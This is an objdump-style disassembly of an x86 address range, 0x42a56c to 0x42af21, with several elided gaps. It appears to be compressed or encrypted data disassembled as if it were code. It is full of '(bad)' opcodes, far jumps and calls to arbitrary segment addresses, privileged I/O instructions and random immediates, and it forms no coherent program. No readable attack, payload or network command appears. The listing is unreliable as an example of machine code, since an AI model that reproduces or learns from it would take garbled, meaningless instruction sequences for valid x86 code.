  42a56c:	(bad)  [eax-0x4c08b93f]
  42a572:	pop    es
  42a573:	cs push es
  42a575:	gs int3 
  42a577:	mov    ah,0xf5
  42a579:	jge    0x42a571
  42a57b:	shl    BYTE PTR [edi],cl
  42a57d:	(bad)  
  42a57e:	pop    esi
  42a57f:	adc    cl,bh
  42a581:	jl     0x42a5dc
  42a583:	(bad)  
  42a584:	adc    DWORD PTR [ebp+0x75865dd7],esi
  42a58a:	jg     0x42a5f7
  42a58c:	inc    edx
  42a58d:	xor    eax,0x262ca88d
  42a592:	jnp    0x42a607
  42a594:	mov    eax,0xbc1a9bf8
  42a599:	ret    0xa7a4
  42a59c:	pop    esi
  42a59d:	(bad)  
  42a59e:	mov    ds:0x7b459f0d,al
  42a5a3:	bndstx [edi+0x7b],(bad)
  42a5a7:	mov    BYTE PTR fs:[ecx+0x70],bh
  42a5ab:	sbb    ebp,ecx
  42a5ad:	or     eax,0x624ecf79
  42a5b2:	js     0x42a58e
  42a5b4:	mov    WORD PTR [edx-0x21],fs
  42a5b7:	sub    ecx,ebp
  42a5b9:	mov    ds:0x4b0d3bd5,al
  42a5be:	out    dx,eax
  42a5bf:	cli    
  42a5c0:	inc    eax
  42a5c1:	jecxz  0x42a5de
  42a5c3:	shl    esp,1
  42a5c5:	lods   eax,DWORD PTR ds:[esi]
  42a5c6:	stc    
  42a5c7:	adc    ecx,DWORD PTR [ebx+0x29]
  42a5ca:	push   esi
  42a5cb:	xchg   ebp,eax
  42a5cc:	fdiv   QWORD PTR [eax-0x143272cb]
  42a5d2:	push   ecx
  42a5d3:	ret    0x756d
  42a5d6:	jmp    0x42a578
  42a5d8:	xchg   edi,eax
  42a5d9:	div    bl
  42a5db:	add    bh,BYTE PTR [esi-0x21]
  42a5de:	pop    esi
  42a5df:	(bad)  [edx-0x95c9244]
  42a5e5:	test   DWORD PTR [ecx],ebp
  42a5e7:	add    al,0xdb
  42a5e9:	jne    0x42a579
  42a5eb:	xchg   edx,eax
  42a5ec:	adc    eax,edx
  42a5ee:	daa    
  42a5ef:	enter  0x3453,0xfa
  42a5f3:	xchg   esp,eax
  42a5f4:	loope  0x42a5fe
  42a5f6:	jns    0x42a57d
  42a5f8:	psrad  mm5,QWORD PTR [eax]
  42a5fb:	mov    ds:0xe603262,al
  42a600:	push   es
  42a601:	call   0x24ab:0x69871093
  42a608:	(bad)  
  42a609:	(bad)  [ebx]
  42a60b:	clc    
  42a60c:	nop
  42a60d:	mov    esi,DWORD PTR [edx+0x5b]
  42a610:	ja     0x42a59d
  42a612:	xor    eax,0x5bd39b10
  42a617:	sbb    al,0x7e
  42a619:	cmp    al,0xab
  42a61b:	ror    DWORD PTR [ebx],cl
  42a61d:	or     ebp,DWORD PTR [edx]
  42a61f:	push   0xffffff92
  42a621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a622:	rcl    bl,cl
  42a624:	push   esp
  42a625:	jecxz  0x42a5ed
  42a627:	leave  
  42a628:	aam    0xf1
  42a62a:	cs jns 0x42a5cf
  42a62d:	adc    DWORD PTR [eax+edi*8+0x30],0x32fb9de4
	...
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0x867323b
  42a6a3:	idiv   BYTE PTR [edi+0x1c57df4]
  42a6a9:	add    BYTE PTR [edi],al
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    BYTE PTR [ebp+0x5],bl
  42a6b0:	fcomp  QWORD PTR [edx]
  42a6b2:	fisttp DWORD PTR [esi+0x7e3552b8]
  42a6b8:	dec    edi
  42a6b9:	lods   al,BYTE PTR ds:[esi]
  42a6ba:	ret    
  42a6bb:	lock adc edi,DWORD PTR es:[edx+0x6c]
  42a6c0:	sub    al,0x34
  42a6c2:	mov    eax,0x5b2a9e53
  42a6c7:	mov    ebp,0xd60a9bf0
  42a6cc:	jp     0x42a740
  42a6ce:	jmp    0x8ef5:0xa59cd778
  42a6d5:	push   0xffffffb9
  42a6d7:	xlat   BYTE PTR ds:[ebx]
  42a6d8:	add    dl,BYTE PTR [esi+0xf]
  42a6db:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42a6dd:	data16 mov bl,0x87
  42a6e0:	repz jnp 0x42a6f5
  42a6e3:	jp     0x42a6d7
  42a6e5:	xchg   ebp,eax
  42a6e6:	jmp    0x6d49a87c
  42a6eb:	jne    0x42a69b
  42a6ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a6ee:	or     DWORD PTR [ecx],edi
  42a6f0:	adc    BYTE PTR [edx+0x18a9da2],ah
  42a6f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6f7:	xchg   esp,eax
  42a6f8:	sub    bh,ch
  42a6fa:	test   eax,0x7a82c373
  42a6ff:	and    BYTE PTR [ecx+edi*8-0x38],ah
  42a703:	div    BYTE PTR [edi-0x2f1b5125]
  42a709:	aad    0xb4
  42a70b:	ret    
  42a70c:	mov    ebp,0x46abb9ae
  42a711:	fucom  st(7)
  42a713:	mov    ebx,0x8430c4b1
  42a718:	(bad)  
  42a719:	mov    ch,0x9d
  42a71b:	aam    0xe6
  42a71d:	sti    
  42a71e:	loopne 0x42a79c
  42a720:	leave  
  42a721:	cli    
  42a722:	and    dh,BYTE PTR [ecx-0x3f076001]
  42a728:	push   0xe956d70e
  42a72d:	xchg   ebx,eax
  42a72e:	sub    eax,0x273bcd80
  42a733:	sub    eax,0x9661a02a
  42a738:	je     0x42a707
  42a73a:	jp     0x42a72a
  42a73c:	cmc    
  42a73d:	cwde   
  42a73e:	das    
  42a73f:	or     eax,0x1fdb997f
  42a744:	into   
  42a745:	mov    eax,0x2b590a22
  42a74a:	xor    edi,DWORD PTR [eax+0x38c92f8f]
  42a750:	retf   
  42a751:	jbe    0x42a6d6
  42a753:	fs out dx,al
  42a755:	mov    edx,0xbcdae480
  42a75a:	sbb    eax,0xd8ac687f
  42a75f:	fstp   TBYTE PTR [ecx-0x3]
  42a762:	(bad)  
  42a763:	nop
  42a764:	mov    dh,0xad
  42a766:	repz hlt 
  42a768:	iret   
  42a769:	call   0x8188:0x4c7848ca
  42a770:	xchg   ebx,eax
  42a771:	lds    edx,FWORD PTR [esi]
  42a773:	aad    0xd8
  42a775:	ins    BYTE PTR es:[edi],dx
  42a776:	pusha  
  42a777:	fs imul ecx,esi,0xffffffdd
  42a77b:	mov    edi,ss
  42a77d:	cwde   
  42a77e:	out    0xc6,al
  42a780:	rcl    DWORD PTR [esi-0x6f83cf80],1
  42a786:	dec    edx
  42a787:	inc    edx
  42a788:	sub    bh,al
  42a78a:	out    dx,al
  42a78b:	imul   ebp,DWORD PTR ds:0x4071b6c8,0x32
  42a792:	loope  0x42a7c3
  42a794:	sub    DWORD PTR [ebp+0x7b],esp
  42a797:	inc    ecx
  42a799:	mov    DWORD PTR [eax-0x7],esi
  42a79c:	push   0xc55642f1
  42a7a1:	scas   eax,DWORD PTR es:[edi]
  42a7a2:	push   ecx
  42a7a3:	retf   
  42a7a4:	adc    al,0x98
  42a7a6:	enter  0xa5d2,0xbd
  42a7aa:	daa    
  42a7ab:	jbe    0x42a7ec
  42a7ad:	push   es
  42a7ae:	test   al,0xcc
  42a7b0:	(bad)
  42a7b3:	inc    DWORD PTR fs:[eax]
	...
  42a816:	mov    ah,BYTE PTR [ebp+0x63]
  42a819:	mov    edi,0x75debfef
  42a81e:	jp     0x42a869
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	clc    
  42a823:	dec    edi
  42a824:	cli    
  42a825:	mov    al,0x84
  42a827:	mov    BYTE PTR [ecx],0x0
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    bh,dl
  42a82f:	dec    esp
  42a830:	push   ebp
  42a831:	(bad)  
  42a832:	lock push 0x1b587d47
  42a838:	das    
  42a839:	das    
  42a83a:	scas   eax,DWORD PTR es:[edi]
  42a83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a83c:	or     eax,0x6dbdbdcc
  42a841:	sbb    edi,0xa2370fb1
  42a847:	push   edx
  42a848:	clc    
  42a849:	adc    al,0x69
  42a84b:	add    al,0xcc
  42a84d:	ins    BYTE PTR es:[edi],dx
  42a84e:	pop    es
  42a84f:	mov    cs,WORD PTR [edx]
  42a851:	inc    edx
  42a852:	cld    
  42a853:	call   0xa8a6:0xe2e6150f
  42a85a:	mov    ds,WORD PTR [ebp+esi*8+0xa54e6b5]
  42a861:	or     BYTE PTR [eax-0x40d5ca06],dl
  42a867:	fcmovu st,st(6)
  42a869:	adc    eax,0xe825614f
  42a86e:	xor    ah,BYTE PTR [esi-0x222e86e2]
  42a874:	inc    edx
  42a875:	pop    es
  42a876:	imul   ecx,DWORD PTR [edx+0x70c0eaf9],0xf99b77c4
  42a880:	mov    dh,0xa1
  42a882:	daa    
  42a883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a884:	scas   al,BYTE PTR es:[edi]
  42a885:	mov    ?,WORD PTR [edi-0x21]
  42a888:	and    dl,0xb1
  42a88b:	nop
  42a88c:	and    dh,bh
  42a88e:	les    ecx,FWORD PTR ds:0x2aa3681a
  42a894:	push   ebx
  42a895:	pop    es
  42a896:	sbb    eax,0xf6974e7d
  42a89b:	sbb    esp,0xdb151e2b
  42a8a1:	inc    ebx
  42a8a2:	xor    BYTE PTR [esi-0x40],bl
  42a8a5:	lahf   
  42a8a6:	inc    esp
  42a8a7:	daa    
  42a8a8:	(bad)
  42a8ac:	adc    al,0xd1
  42a8ae:	mov    bl,0x71
  42a8b0:	mov    ecx,DWORD PTR [edi+0x6d]
  42a8b3:	xchg   ebx,eax
  42a8b4:	test   eax,edx
  42a8b6:	dec    ecx
  42a8b7:	shl    BYTE PTR [ecx+0x4d],cl
  42a8ba:	adc    eax,0x574a89ca
  42a8bf:	add    DWORD PTR [edi],ebx
  42a8c1:	retf   0x8136
  42a8c4:	jg     0x42a892
  42a8c6:	add    esp,DWORD PTR [ebx-0x13b159b5]
  42a8cc:	jno    0x42a8aa
  42a8ce:	adc    eax,0x19db511
  42a8d3:	(bad)  
  42a8d5:	lods   eax,DWORD PTR ds:[esi]
  42a8d6:	add    BYTE PTR [ebp+0x55dda486],0x42
  42a8dd:	ins    BYTE PTR es:[edi],dx
  42a8de:	hlt    
  42a8df:	es dec edx
  42a8e1:	lods   eax,DWORD PTR ds:[esi]
  42a8e2:	repz sub ah,BYTE PTR ds:[eax+0xd]
  42a8e7:	sbb    bh,BYTE PTR [ecx+0x6965a03]
  42a8ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8ee:	jp     0x42a8d3
  42a8f0:	sub    al,0x78
  42a8f2:	adc    BYTE PTR [edx+ebp*2],ah
  42a8f5:	jg     0x42a94e
  42a8f7:	jbe    0x42a90c
  42a8f9:	mov    esi,0xd0b23d29
  42a8fe:	mov    eax,ds:0x41414267
  42a903:	(bad)
  42a906:	dec    edi
  42a907:	push   ecx
  42a908:	test   eax,0xb836775b
  42a90d:	daa    
  42a90e:	ds test eax,0xfd2328c9
  42a914:	arpl   WORD PTR [edi],bp
  42a916:	ins    BYTE PTR es:[edi],dx
  42a917:	test   DWORD PTR [edx+0x4f],0x5c5e6cab
  42a91e:	pusha  
  42a91f:	int    0x21
  42a921:	por    mm0,QWORD PTR [ebx]
  42a924:	adc    edi,DWORD PTR [ecx+0x31]
  42a927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a928:	fs fsubrp st(2),st
  42a92b:	cmp    eax,DWORD PTR [ebp+0x106b0179]
  42a931:	mov    BYTE PTR [ebx+0xcf85],ch
	...
  42a993:	add    BYTE PTR [eax],al
  42a995:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a99b:	out    dx,al
  42a99c:	sti    
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     esi,DWORD PTR [edi-0x7449d0f9]
  42a9a7:	mov    DWORD PTR [ecx],0x10700
  42a9ad:	add    BYTE PTR [esi+0x3a],dh
  42a9b0:	push   cs
  42a9b1:	std    
  42a9b2:	adc    ch,BYTE PTR [eax]
  42a9b4:	or     esp,ebx
  42a9b6:	jmp    0x9342:0x59541a75
  42a9bd:	ror    DWORD PTR [esp+ebx*4-0x4b95f4f7],1
  42a9c4:	adc    al,BYTE PTR [edx-0x4b]
  42a9c7:	loopne 0x42a95b
  42a9c9:	shl    BYTE PTR [esp+ecx*4+0x15],1
  42a9cd:	mov    eax,ds:0x71e1009
  42a9d2:	mov    ah,0xb8
  42a9d4:	bound  edx,QWORD PTR [ecx]
  42a9d6:	loopne 0x42a9f8
  42a9d8:	mov    dh,BYTE PTR [ecx-0x6dc29df8]
  42a9de:	enter  0xd8a8,0x7e
  42a9e2:	or     esi,esp
  42a9e4:	mov    ds:0xe68c742a,eax
  42a9e9:	loopne 0x42aa2f
  42a9eb:	dec    ecx
  42a9ec:	jecxz  0x42a98d
  42a9ee:	cli    
  42a9ef:	mov    WORD PTR ds:0xdf967314,ds
  42a9f5:	xor    eax,0xd72d2e39
  42a9fa:	es repz mov eax,0xa6792c2a
  42aa01:	cmp    eax,0x8f631425
  42aa06:	gs jns 0x42aa77
  42aa09:	adc    edi,ebp
  42aa0b:	leave  
  42aa0c:	cmp    BYTE PTR [ebp+0x3ad6cea5],cl
  42aa12:	nop
  42aa13:	mov    ebx,0x181349df
  42aa18:	cli    
  42aa19:	cdq    
  42aa1a:	out    0xb7,eax
  42aa1c:	(bad)  
  42aa1e:	mov    esi,0xa6b93abd
  42aa23:	dec    edx
  42aa24:	cld    
  42aa25:	idiv   eax
  42aa27:	loop   0x42aa58
  42aa29:	pop    ebp
  42aa2a:	(bad)  
  42aa2b:	add    eax,0xf90b5dab
  42aa30:	addr16 int 0xf1
  42aa33:	icebp  
  42aa34:	(bad)  
  42aa35:	popa   
  42aa36:	repnz fs xchg ebp,eax
  42aa39:	mov    bl,0xa6
  42aa3b:	aaa    
  42aa3c:	sub    DWORD PTR [edx+0x21996f17],ebx
  42aa42:	lahf   
  42aa43:	out    dx,eax
  42aa44:	imul   bh
  42aa46:	ficom  WORD PTR [bx]
  42aa49:	sub    BYTE PTR [ecx+0x1dfe63ac],ah
  42aa4f:	je     0x42aa9b
  42aa51:	es xchg ebp,eax
  42aa53:	pop    eax
  42aa54:	dec    esi
  42aa55:	scas   eax,DWORD PTR es:[edi]
  42aa56:	xabort 0x5f
  42aa59:	mul    DWORD PTR [edi-0x7]
  42aa5c:	pop    ebx
  42aa5d:	dec    BYTE PTR [edx-0x1bee34cf]
  42aa63:	push   edi
  42aa64:	daa    
  42aa65:	or     cl,dh
  42aa67:	and    bh,BYTE PTR [eax+0x3d]
  42aa6a:	jno    0x42a9ec
  42aa6c:	xchg   ebp,eax
  42aa6d:	push   ds
  42aa6e:	das    
  42aa6f:	pop    eax
  42aa70:	and    DWORD PTR [edi+0x28a3ed17],ebx
  42aa76:	jl     0x42aa8d
  42aa78:	sbb    DWORD PTR [edx+0x4d],0xa8212b0a
  42aa7f:	jmp    0x59ecc5ba
  42aa84:	pop    ss
  42aa85:	loopne 0x42aa8f
  42aa87:	xor    ecx,DWORD PTR [edx*4+0x32eb549e]
  42aa8e:	sub    edi,ebx
  42aa90:	xchg   esp,eax
  42aa91:	mov    ds:0xc0e7c6b3,eax
  42aa96:	jmp    0x42aae2
  42aa98:	aam    0x2d
  42aa9a:	fisub  DWORD PTR ds:0xab8ac7b8
  42aaa0:	sbb    eax,0xea91eaf8
  42aaa5:	ins    DWORD PTR es:[edi],dx
  42aaa6:	xor    eax,0xee09c880
  42aaab:	sub    DWORD PTR [esi-0x2a],esp
  42aaae:	mov    dl,BYTE PTR [esi+edi*4-0x9]
  42aab2:	jg     0x42ab20
  42aab4:	add    DWORD PTR [eax],eax
	...
  42ab16:	ds push cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR ds:0x9234b791,ecx
  42ab27:	enter  0x1,0x7
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [edi+0x74],dh
  42ab30:	dec    ebx
  42ab31:	jb     0x42aae4
  42ab33:	sub    eax,0x6c10b055
  42ab38:	lods   al,BYTE PTR ds:[esi]
  42ab39:	cdq    
  42ab3a:	ja     0x42ab05
  42ab3c:	sbb    al,0xc5
  42ab3e:	and    edi,DWORD PTR [ebx-0x3568e9e4]
  42ab44:	or     bl,BYTE PTR [ebp-0x10]
  42ab47:	sub    ecx,0xffffff94
  42ab4a:	cmp    BYTE PTR [ecx],0x7f
  42ab4d:	inc    edi
  42ab4e:	ds and esi,edx
  42ab51:	mov    bh,0x91
  42ab53:	sub    BYTE PTR ds:0xce5f1aa9,al
  42ab59:	or     cl,ch
  42ab5b:	scas   al,BYTE PTR es:[edi]
  42ab5c:	test   ah,dl
  42ab5e:	jge    0x42abb2
  42ab60:	pop    eax
  42ab61:	mov    esp,0xe8141d36
  42ab66:	sahf   
  42ab67:	jne    0x42abd3
  42ab69:	mov    ch,0x8e
  42ab6b:	mov    gs:0xa98de508,al
  42ab71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab72:	xor    BYTE PTR [ebp-0x399c22e6],dh
  42ab78:	cmp    ebx,DWORD PTR [ecx]
  42ab7a:	scas   al,BYTE PTR es:[edi]
  42ab7b:	subps  xmm4,xmm6
  42ab7e:	iret   
  42ab7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab80:	or     BYTE PTR [ebx],al
  42ab82:	(bad)  
  42ab83:	mov    ebx,0x375d3295
  42ab88:	inc    edi
  42ab89:	popf   
  42ab8a:	fcomp  QWORD PTR [edx+edi*8-0x129274d1]
  42ab91:	mov    bh,ch
  42ab93:	jle    0x42abaf
  42ab95:	out    dx,al
  42ab96:	cld    
  42ab97:	sbb    BYTE PTR [eax],bl
  42ab99:	int3   
  42ab9a:	inc    ebx
  42ab9b:	pop    edx
  42ab9c:	int    0x53
  42ab9e:	dec    ecx
  42ab9f:	in     al,dx
  42aba0:	ins    BYTE PTR es:[edi],dx
  42aba1:	out    0x94,al
  42aba3:	test   WORD PTR [edx+0x24],si
  42aba7:	inc    eax
  42aba8:	nop
  42aba9:	pop    ds
  42abaa:	xchg   ebx,eax
  42abab:	and    dh,ch
  42abad:	in     al,0xcd
  42abaf:	adc    DWORD PTR [ecx],0x562f4a7
  42abb5:	stos   DWORD PTR es:[edi],eax
  42abb6:	inc    ebp
  42abb7:	push   es
  42abb8:	(bad)  
  42abb9:	rcr    BYTE PTR [edi+0x56],1
  42abbc:	push   esp
  42abbd:	inc    edx
  42abbe:	or     bl,BYTE PTR [ebx-0x1420fd12]
  42abc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42abc5:	pop    es
  42abc6:	mov    dh,0xb2
  42abc8:	enter  0x7e3,0x26
  42abcc:	pop    ebx
  42abcd:	mov    BYTE PTR ds:0x24285e68,ch
  42abd3:	pop    ecx
  42abd4:	retf   0x8925
  42abd7:	loopne 0x42abe8
  42abd9:	lock dec eax
  42abdb:	jo     0x42ac11
  42abdd:	add    al,0x1c
  42abdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42abe0:	aaa    
  42abe1:	aas    
  42abe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42abe3:	and    ah,ah
  42abe5:	jecxz  0x42ac40
  42abe7:	or     DWORD PTR [ebx+0x3b27fd9e],esp
  42abed:	adc    DWORD PTR [ebx-0x4729c692],eax
  42abf3:	mul    DWORD PTR [eax+edx*2-0x1f]
  42abf7:	sbb    esp,DWORD PTR [ecx+0x55]
  42abfa:	or     BYTE PTR [eax],bh
  42abfc:	or     DWORD PTR [ebx],ecx
  42abfe:	dec    eax
  42abff:	xor    al,0x4c
  42ac01:	stos   BYTE PTR es:[edi],al
  42ac02:	or     edi,DWORD PTR [eax]
  42ac04:	(bad)  
  42ac06:	hlt    
  42ac07:	cwde   
  42ac08:	(bad)  
  42ac0a:	nop
  42ac0b:	add    dh,BYTE PTR [ebx-0x43]
  42ac0e:	prefetch (bad)
  42ac0f:	or     eax,0x209c7cfb
  42ac14:	aam    0x82
  42ac16:	jno    0x42ac4c
  42ac18:	mov    ch,BYTE PTR [ebx]
  42ac1a:	sbb    eax,0x40176877
  42ac1f:	sti    
  42ac20:	data16 jg 0x42abe5
  42ac23:	aaa    
  42ac24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac25:	cdq    
  42ac26:	xchg   ebx,eax
  42ac27:	mov    edi,DWORD PTR [esi+0x6bc892cd]
  42ac2d:	mov    cl,0x33
  42ac2f:	pop    esp
  42ac30:	xchg   esp,eax
  42ac31:	cs inc esi
  42ac33:	mov    esp,0xf7
	...
  42ac94:	add    BYTE PTR [eax],al
  42ac96:	jmp    0xdf7cc8cd
  42ac9b:	ds out dx,eax
  42ac9d:	repz rcl BYTE PTR [edi+0x16010a59],cl
  42aca4:	xor    edi,DWORD PTR [ebx-0x67]
  42aca7:	leave  
  42aca8:	add    DWORD PTR [eax],eax
  42acaa:	pop    es
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    BYTE PTR [edx],ch
  42acaf:	cs pop ss
  42acb1:	into   
  42acb2:	shr    DWORD PTR ds:0x353185d4,cl
  42acb8:	mov    ch,0x30
  42acbb:	xchg   ecx,eax
  42acbc:	push   edi
  42acbd:	call   DWORD PTR [edi]
  42acbf:	inc    edx
  42acc0:	sbb    eax,0xd7a3ef16
  42acc5:	sub    esp,ecx
  42acc7:	jl     0x42acf7
  42acc9:	mov    ah,0x73
  42accb:	mov    esi,0x9647b29b
  42acd0:	cmp    al,0xba
  42acd2:	stos   BYTE PTR es:[edi],al
  42acd3:	push   ss
  42acd4:	ds paddq mm6,mm1
  42acd8:	ja     0x42acde
  42acda:	call   FWORD PTR [edx+edi*1]
  42acdd:	cmc    
  42acde:	addr16 mov dl,0xe8
  42ace1:	sahf   
  42ace2:	dec    ecx
  42ace3:	xchg   ecx,eax
  42ace4:	mov    esp,0xdc6da28a
  42ace9:	pop    ebx
  42acea:	mov    al,0xa3
  42acec:	mov    bl,0x8d
  42acee:	push   ebp
  42acef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42acf0:	xor    al,BYTE PTR [edx]
  42acf2:	repnz cmp al,0x47
  42acf5:	stc    
  42acf6:	pop    ds
  42acf7:	bound  edi,QWORD PTR [esi]
  42acf9:	bound  esp,QWORD PTR [edi]
  42acfb:	jnp    0x42acc0
  42acfd:	(bad)  
  42acfe:	jne    0x42acfb
  42ad00:	fs aad 0x1c
  42ad03:	mov    dl,0x4e
  42ad05:	xor    al,0x6
  42ad07:	test   al,0xd8
  42ad09:	mov    BYTE PTR [ecx],ch
  42ad0b:	jle    0x42ace9
  42ad0d:	mov    ebx,0x7f1c9f8a
  42ad12:	cmc    
  42ad13:	pusha  
  42ad14:	inc    ebx
  42ad15:	aas    
  42ad16:	xchg   esp,eax
  42ad17:	inc    esp
  42ad18:	dec    esp
  42ad19:	daa    
  42ad1a:	mov    bl,0x93
  42ad1c:	jmp    0x3236:0xb0aae9d1
  42ad23:	jmp    0x1d69a18b
  42ad28:	or     eax,0x192b5104
  42ad2d:	fld    st(0)
  42ad2f:	inc    esp
  42ad30:	jle    0x42ad95
  42ad32:	ss aaa 
  42ad34:	(bad)  [edi+0x36ee8195]
  42ad3a:	inc    ebp
  42ad3b:	dec    esi
  42ad3c:	push   edx
  42ad3d:	dec    edi
  42ad3e:	lods   al,BYTE PTR ds:[esi]
  42ad3f:	pop    ds
  42ad40:	add    esi,DWORD PTR [ebx+esi*4]
  42ad43:	mov    ch,0x18
  42ad45:	and    bh,BYTE PTR [ebp-0x104720aa]
  42ad4b:	dec    esp
  42ad4c:	pusha  
  42ad4d:	fmul   QWORD PTR [ecx+esi*1+0x6bc6d4bd]
  42ad54:	xchg   edi,eax
  42ad55:	add    BYTE PTR [edi+0x530e97e1],bh
  42ad5b:	pop    ebp
  42ad5c:	mov    esp,0xec6a7359
  42ad61:	pop    esi
  42ad62:	fidivr DWORD PTR [edx-0x6535a66b]
  42ad68:	fs jnp 0x42ad0f
  42ad6b:	popa   
  42ad6c:	inc    esi
  42ad6d:	adc    bh,BYTE PTR ds:0xf80979b3
  42ad73:	getsec 
  42ad75:	nop
  42ad76:	and    ebx,DWORD PTR [ecx-0x34993707]
  42ad7c:	mov    ds:0x8fd9037f,eax
  42ad81:	sbb    al,0xad
  42ad83:	lods   al,BYTE PTR ds:[si]
  42ad85:	add    BYTE PTR [esp+ebp*8-0x748c9fa8],ah
  42ad8c:	mov    gs,WORD PTR [edx+0x4d]
  42ad8f:	jne    0x42ad7a
  42ad91:	test   BYTE PTR [ebp+0x71],cl
  42ad94:	ficomp WORD PTR [edx]
  42ad96:	fs dec edx
  42ad98:	out    0x33,eax
  42ad9a:	xchg   edx,eax
  42ad9b:	or     eax,DWORD PTR [esi-0x53]
  42ad9e:	pop    ds
  42ad9f:	and    BYTE PTR [edx-0x66594157],cl
  42ada5:	jb     0x42ad64
  42ada7:	ja     0x42adee
  42ada9:	xchg   edx,eax
  42adaa:	mov    DWORD PTR [esi],eax
  42adac:	jno    0x42ade3
  42adae:	inc    esi
  42adaf:	mov    edx,0x1468ccd9
  42adb4:	xchg   ecx,eax
	...
  42ae15:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [edx+ebx*4-0x5fdbc79b]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    bh,al
  42ae2f:	gs cs jbe 0x42ae78
  42ae33:	mov    ds:0x447fa445,al
  42ae38:	sbb    BYTE PTR [edx+0x7110c3b3],0xc3
  42ae3f:	jp     0x42ae60
  42ae41:	pop    ebx
  42ae42:	or     BYTE PTR [edi],bh
  42ae44:	pop    ebx
  42ae45:	js     0x42aea7
  42ae47:	dec    ebp
  42ae48:	xchg   edx,eax
  42ae49:	sub    esi,ebx
  42ae4b:	add    DWORD PTR [eax],ebx
  42ae4d:	xor    ch,BYTE PTR [ecx-0x7c84bb46]
  42ae53:	aad    0xc7
  42ae55:	aad    0x2b
  42ae57:	mov    ah,0x7d
  42ae59:	jmp    0xa0f10cf5
  42ae5e:	and    ch,BYTE PTR [esp+edi*4]
  42ae61:	scas   eax,DWORD PTR es:[edi]
  42ae62:	mov    BYTE PTR [edx-0x1f],dh
  42ae65:	xchg   edi,eax
  42ae66:	dec    ebp
  42ae67:	inc    ebx
  42ae68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae69:	and    ch,ah
  42ae6b:	cmc    
  42ae6c:	das    
  42ae6d:	cmp    esi,DWORD PTR [ebx]
  42ae6f:	es call 0x10da:0x20647627
  42ae77:	imul   ebp,DWORD PTR [ecx],0xffffffe2
  42ae7a:	dec    ebx
  42ae7b:	push   0xc44c3a3
  42ae80:	xor    BYTE PTR [ecx],al
  42ae82:	mov    al,ds:0x8ae3f618
  42ae87:	mov    eax,0x66c0a030
  42ae8c:	lods   eax,DWORD PTR ds:[esi]
  42ae8d:	xchg   esp,eax
  42ae8e:	mov    al,ds:0xeea3b47d
  42ae93:	mov    ebx,0x569d7510
  42ae98:	(bad)  
  42ae99:	jmp    0xb312:0x2ae066e5
  42aea0:	(bad)  
  42aea1:	push   ecx
  42aea2:	or     DWORD PTR [edi-0x52],0xd8166637
  42aea9:	mov    bl,0xd7
  42aeab:	test   DWORD PTR [ecx+0x50],edi
  42aeae:	push   es
  42aeaf:	jmp    0x5834:0x97cb1a9c
  42aeb6:	test   al,0x39
  42aeb8:	sbb    eax,0xad5f6e5b
  42aebd:	std    
  42aebe:	push   ss
  42aebf:	add    al,0x3a
  42aec1:	fst    DWORD PTR [ebp-0x3d49d77f]
  42aec7:	mov    dl,0xc8
  42aec9:	adc    eax,0x2f56507e
  42aece:	push   eax
  42aecf:	es adc eax,0x6c123bf5
  42aed5:	daa    
  42aed6:	dec    eax
  42aed7:	pusha  
  42aed8:	shl    DWORD PTR [edx+eax*4+0x40],0x28
  42aedd:	xchg   esi,eax
  42aede:	mov    bh,0x50
  42aee0:	aam    0x40
  42aee2:	or     bh,0xc9
  42aee5:	jl     0x42af66
  42aee7:	jb     0x42af32
  42aee9:	dec    ebp
  42aeea:	and    cl,BYTE PTR [ecx+ecx*8+0x6a]
  42aeee:	inc    ebp
  42aeef:	mov    edi,edx
  42aef1:	mov    esi,0xfef38bd7
  42aef6:	loop   0x42af01
  42aef8:	sbb    al,0x88
  42aefa:	lahf   
  42aefb:	push   edx
  42aefc:	jle    0x42aed3
  42aefe:	fwait
  42aeff:	cmp    ecx,DWORD PTR [edi]
  42af01:	cmp    edx,ecx
  42af03:	or     al,0x1c
  42af05:	cmp    ecx,ebx
  42af07:	pushf  
  42af08:	cmp    DWORD PTR [ebp-0x7419e0e5],esp
  42af0e:	fsub   st(7),st
  42af10:	dec    ebp
  42af11:	fadd   st,st(7)
  42af13:	fld    DWORD PTR [eax]
  42af15:	dec    ebp
  42af16:	adc    eax,0xbeca2f0f
  42af1b:	std    
  42af1c:	xchg   esp,eax
  42af1d:	inc    ebp
  42af1e:	ds loop 0x42af1a
  42af21:	leave  
